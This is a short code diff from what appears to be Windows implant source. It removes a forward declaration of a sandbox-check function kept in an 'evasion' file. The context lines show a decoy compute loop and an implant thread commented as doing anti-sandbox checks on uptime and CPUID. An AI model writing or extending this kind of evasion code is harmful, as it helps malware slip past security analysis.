@@ -29,8 +29,6 @@ static void DecoyLoop() {
     for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
 }
 
-BOOL SandboxCheck();  // implemented in evasion.cpp
-
 DWORD WINAPI ImplantThread(LPVOID) {
     // Anti-sandbox: decoy compute first, then uptime/CPUID check
     DecoyLoop();
